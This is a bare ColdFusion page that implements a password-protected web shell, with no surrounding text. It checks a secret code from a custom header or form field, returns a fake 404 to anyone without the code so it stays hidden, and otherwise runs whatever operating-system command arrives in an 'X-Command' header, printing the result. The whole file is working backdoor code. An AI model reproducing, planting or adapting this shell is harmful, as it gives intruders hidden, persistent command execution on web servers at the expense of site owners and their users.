<cfsetting showdebugoutput="no">
<cfset secretCode = "lErs2CC2BdpUtHYW0miiSNncE" /> <!--- Set this to something unique like a randomly generated SHA1 Hash --->
<cfset QuoteMark = "'" />
<cfset DoubleQuoteMark = """" />

<!--- Authentication: Check for the GUID in either a custom header or POSTed by the form --->
<cfset suppliedCode = "" />
<cfif structKeyExists(GetHttpRequestData().headers, "X-Auth-Code")>
    <cfset suppliedCode = "#StructFind(GetHttpRequestData().headers, "X-Auth-Code")#" />
<cfelseif structKeyExists(FORM, "authCode")>
    <cfset suppliedCode = "#StructFind(FORM, "authCode")#" />
</cfif>


<cfif ( #suppliedCode# neq secretCode )>
    <cfheader statuscode="404" statustext="Page Not Found" />
    <cfabort />
</cfif>

<cfset command = "#StructFind(GetHttpRequestData().headers, "X-Command")#" />

<cfexecute name="#command#" timeout="5" variable="foo"></cfexecute>
<cfoutput>Result:</cfoutput>
<cfoutput>#foo#</cfoutput>
</cfsetting>
